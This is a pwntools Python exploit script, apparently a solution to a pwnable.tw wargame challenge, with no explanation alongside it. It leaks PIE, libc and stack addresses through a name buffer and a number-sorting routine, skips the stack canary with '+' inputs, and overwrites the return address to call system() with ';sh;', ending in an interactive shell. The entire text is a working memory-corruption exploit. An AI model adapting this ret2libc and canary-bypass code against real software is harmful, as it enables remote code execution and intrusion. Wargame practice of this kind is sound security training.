from pwn import *
io = remote('chall.pwnable.tw',10101)
#io = remote('127.0.0.1',4000)

def enter(num):
    io.recvuntil('number : ')
    io.sendline(num)

io.recvuntil('name :')
io.send('a'*0x1f + 'b')

io.recvuntil('ab')
pie = u32(io.recvuntil('sort :')[:4]) - 0x601
print('pie :' + hex(pie))
#print(str(pie))

io.sendline('35')

for i in range(23):
    enter('0')
enter('+')
enter('+')
for i in range(7):
    enter(str(0x40000000))
enter('+')
enter(str(pie+0x9c3))
enter('0')
#enter(str(0xffffffff))

io.recvuntil('Result :\n')
for i in range(33):
    print(io.recvuntil(' ')[:-1])
libc_base = int(io.recvuntil(' ')[:-1],10) - 0x18637
print('libc base:' + hex(libc_base))
system = libc_base + 0x3a940

stack = int(io.recvuntil(' ')[:-1],10)
print('stack :' + hex(stack))

io.recvuntil('name :')
io.sendline('secret')
io.recvuntil('sort :')
#raw_input()
io.sendline('32')
#raw_input()
for i in range(24):
    enter(str(0))
enter('+')
enter(str(u32(';sh;')))
for i in range(3):
    enter(str(0x40000000))
#raw_input()
#enter(str(one_gadget))
#raw_input()
#enter(str(pie+0x9c3))
puts = libc_base + 0x5f140
#enter(str(puts))
enter(str(system))
#raw_input()
enter(str(stack-0xac))
enter(str(stack-0xac))

io.interactive()
